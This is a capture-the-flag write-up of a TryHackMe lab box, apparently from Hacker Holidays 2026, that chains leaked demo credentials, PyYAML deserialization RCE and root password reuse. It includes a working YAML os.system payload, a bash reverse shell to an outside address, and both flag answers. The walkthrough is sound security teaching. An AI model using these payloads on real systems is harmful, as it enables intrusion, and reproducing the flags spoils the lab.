| Field | Detail |
|------|--------|
| **Platform** | TryHackMe |
| **Event** | Hacker Holidays 2026 — The Byte Lotus |
| **Day** | 5 |
| **Room** | Beach Bar |
| **Category** | Boot2Root / YAML deserialization + credential reuse |
| **Flag format** | `THM{...}` |

---

## Objective

**Beach Bar** is an Easy-rated Boot2Root box built around a Flask jukebox web app served by **gunicorn**. The route to root chains three real-world mistakes: demo credentials leaked in an HTML comment, an insecure YAML deserialization sink (`yaml.load` with the full `Loader`) that hands you remote code execution through the playlist import feature, and a root-run daemon that leaks its password on the process command line — a password reused for the root account. There are two flags to capture: the user flag and the root flag.

By the end of this room you will be able to:

- Enumerate a web target with **ffuf** and **nmap** and recognise which endpoints are auth-gated
- Spot leaked demo credentials hidden in **login-page HTML comments**
- Identify and exploit an **insecure YAML deserialization** sink (`yaml.load(..., Loader=yaml.Loader)`) for RCE
- Build a malicious YAML payload using the `!!python/object/apply:os.system` tag
- Confirm code execution with an **ICMP callback**, then upgrade to a **bash reverse shell**
- Use **pspy** to catch a root process leaking a secret on its command line
- Exploit **credential reuse** to escalate from a service user to `root`

> **Authorisation warning:** The techniques below — directory brute-forcing, deserialization RCE, reverse shells and privilege escalation — must only ever be run against systems you have **explicit authorization** to test, here the TryHackMe lab. Running them against systems you do not own or control is illegal.

---

## Story Hook

The room's briefing hides the whole kill chain in plain language: _"a DJ who never logs out, a song queue that accepts a little more than song titles, a service down the boardwalk quietly announcing 'something'"_ and _"the night-shift developer wired the jukebox straight into the floor with the trimmings still attached."_

Each phrase maps to a real vulnerability — the **DJ who never logs out** is a leaked demo login, the **song queue that accepts more than song titles** is the YAML deserialization sink in the playlist import, and the **service quietly announcing something** is the root password leaked on a process command line.

---

## Attack Path

| **1** | **Recon**<br>ffuf finds `/login` (200) plus `/dashboard`, `/export`, `/import`, `/logout` (302 → `/login`, i.e. auth-gated). `nmap -p-` shows only 22 (SSH) and 80 (HTTP, gunicorn). SQLi on the login form is a dead end (decoy). |
| --- | --- |

| **2** | **Leaked creds — "DJ who never logs out"**<br>The login page HTML contains a staff comment leaking `dj / dj` (ticket BAR-7, "demo DJ login still enabled"). Log in as `dj:dj`. |
| --- | --- |

| **3** | **Foothold — YAML deserialization RCE**<br>The `/import` feature parses a playlist with `yaml.load(content, Loader=yaml.Loader)` (unsafe full loader). A malicious YAML payload using a `!!python/object/apply:os.system` tag executes commands as the web user. Confirm with an ICMP callback, then swap for a bash reverse shell → shell as **bartender** (the gunicorn worker). |
| --- | --- |

| **4** | **User flag**<br>Read `/home/bartender/user.txt`. |
| --- | --- |

| **5** | **Privesc — credential reuse**<br>`pspy` reveals a root process (UID=0) running `jukeboxd.py --stream-pass SunsetSpritz2024! --bitrate 320k`. The `--stream-pass` value is readable by any user via `ps`, and it is reused as the root password → `su root`. |
| --- | --- |

| **6** | **Root flag**<br>Read `/root/root.txt`. |
| --- | --- |

---

## Walkthrough

### 1. Enumerate the app

Directory brute-force and a full port scan. `ffuf` maps the routes and `nmap` confirms only SSH and HTTP are exposed:

```bash
$ ffuf -u http://10.144.134.194/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -fc 404
# -> login (200), dashboard/export/import/logout (302 -> /login)
$ nmap -sC -sV -p- -T4 10.144.134.194
# -> 22 OpenSSH, 80 gunicorn (Flask)
```

### 2. Rule out the login SQLi and read the page source

SQLi on the login form is a decoy — every payload returns "Invalid credentials". Reading the login page source reveals an HTML comment leaking the demo credentials:

```text
staff note: the demo DJ login is still enabled for the soft opening.
dj / dj  -- swap this before the season starts (ticket BAR-7)
```

### 3. Log in and reach the authenticated import feature

Authenticate as `dj:dj`, store the session cookie, then hit the dashboard to find the YAML-accepting import feature:

```bash
$ curl -s -c cookies.txt -X POST http://10.144.134.194/login --data "username=dj&password=dj"
$ curl -s -b cookies.txt http://10.144.134.194/dashboard    # -> "Import playlist" (accepts YAML)
```

### 4. Confirm YAML-deserialization RCE

Start a listener on the host (`sudo tcpdump -i any icmp`), then import this `playlist.yml` (tun0 IP = `192.168.139.84`). The `!!python/object/apply:os.system` tag makes the unsafe loader execute a command:

```yaml
!!python/object/apply:os.system
- "ping -c 3 192.168.139.84"
```

tcpdump showed the target's echo requests → RCE confirmed.

### 5. Get a shell

Start `nc -lvnp 4444`, then import the reverse-shell payload:

```yaml
!!python/object/apply:os.system
- "bash -c 'bash -i >& /dev/tcp/192.168.139.84/4444 0>&1'"
```

Caught a shell as **bartender** in `/opt/beach-bar/webapp`. Stabilized with `python3 -c 'import pty;pty.spawn("/bin/bash")'`.

### 6. User flag

```bash
$ cat /home/bartender/user.txt   # THM{y4ml_pl4yl1st_pwns_th3_b34ch}
```

### 7. Privesc enumeration

`sudo -l` needed a password (none in `app.py` — it only had `dj:dj` and a fixed Flask key). SUID/`getcap`/cron were all stock. `pspy64` revealed the root-run jukebox daemon leaking a password on its command line:

```bash
$ cd /tmp; wget http://192.168.139.84/pspy64; chmod +x pspy64; ./pspy64
# CMD: UID=0 ... jukeboxd.py --stream-pass SunsetSpritz2024! --bitrate 320k
```

### 8. Credential reuse → root

The leaked stream password is reused as the root password:

```bash
$ su root            # password: SunsetSpritz2024!
$ cat /root/root.txt # THM{cr3d3nt14l_r3us3_4t_th3_b34ch_b4r}
```

---

## Flag

> **🚩 Flag**
>
> **User flag:** `THM{y4ml_pl4yl1st_pwns_th3_b34ch}`
>
> **Root flag:** `THM{cr3d3nt14l_r3us3_4t_th3_b34ch_b4r}`

### Key host facts

| Item | Value |
|---|---|
| **App** | Flask (`/opt/beach-bar/webapp/app.py`) served by gunicorn as user `bartender` |
| **Vuln sink** | `yaml.load(content, Loader=yaml.Loader)` in the `/import` route |
| **Demo creds** | `dj:dj` (leaked in login-page HTML comment, ticket BAR-7) |
| **Root daemon** | `/opt/beach-bar/jukeboxd/jukeboxd.py` run as root (via systemd/service) |
| **Leaked secret** | `--stream-pass SunsetSpritz2024!` (visible in `ps`) = root password |

---

## Key Takeaways

- Never use `yaml.load()` / `yaml.Loader` on untrusted input — it instantiates arbitrary Python objects (RCE). Use `yaml.safe_load()`.
- Don't ship demo/default credentials (`dj:dj`) to production.
- Never pass secrets as command-line arguments — they are world-readable via `ps` / `/proc/<pid>/cmdline`. Use env files or a secrets store.
- Don't reuse a service password as the root password (credential reuse).

---

## Final Takeaway

Beach Bar is a compact lesson in how ordinary developer shortcuts compound into a full **Boot2Root** compromise. The foothold is **insecure YAML deserialization** — calling `yaml.load` with the full `Loader` on attacker-controlled input lets a `!!python/object/apply:os.system` payload run arbitrary commands, turning a "playlist import" into remote code execution and a **reverse shell**. Getting there only required **leaked demo credentials** buried in an HTML comment, and the final hop to `root` came from a daemon leaking its `--stream-pass` secret on the command line where any user can read it via **ps** — a secret reused as the root password. The recurring theme is trust boundaries: treat imported data as **untrusted input** (`yaml.safe_load`), keep secrets out of command-line arguments, and never reuse a service password for a privileged account.

---
*Adapted from the [Hacker Holidays 2026 findings log](https://github.com/Varun-Patkar/HackerHolidays) by Varun Anand Patkar (MIT License).*
